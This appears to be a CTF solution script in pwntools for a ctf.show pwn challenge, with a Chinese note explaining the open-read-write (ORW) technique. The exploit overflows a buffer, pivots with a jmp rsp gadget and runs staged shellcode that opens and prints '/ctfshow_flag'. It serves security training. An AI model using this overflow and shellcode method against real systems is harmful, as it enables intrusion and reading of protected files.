from pwn import *

context(arch="amd64",log_level="debug")

p = remote("pwn.challenge.ctf.show", 28118)

addr=0x123000

jmp_rsp=0x0000000000400A01

payload = asm(shellcraft.read(0,addr,0x100))+asm("mov rax,0x123000; jmp rax")

payload=payload.ljust(0x28,b'\x00')

payload += p64(jmp_rsp) + asm("sub rsp,0x30; jmp rsp")

p.recvuntil(b'to do')

p.sendline(payload)

payload1 = shellcraft.open('/ctfshow_flag',0)

payload1 += shellcraft.read(3, addr, 100)

payload1 += shellcraft.write(1, addr, 100)

payload1=asm(payload1)

p.sendline(payload1)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ORW - Open Read Write
2. 核心原理：
   - 当无法获取shell时，直接读取flag文件
   - 使用系统调用open、read、write
   - 打开flag文件，读取内容，输出到stdout
3. ORW流程：
   - open("flag", 0)：打开flag文件
   - read(fd, buf, size)：读取文件内容到缓冲区
   - write(1, buf, size)：将内容输出到stdout
4. 实现方式：
   - 手写汇编shellcode
   - 使用pwntools的shellcraft
   - 构造ROP链调用系统调用
5. 应用场景：
   - 远程环境无法反弹shell
   - 题目要求读取特定文件
   - execve被禁用
"""
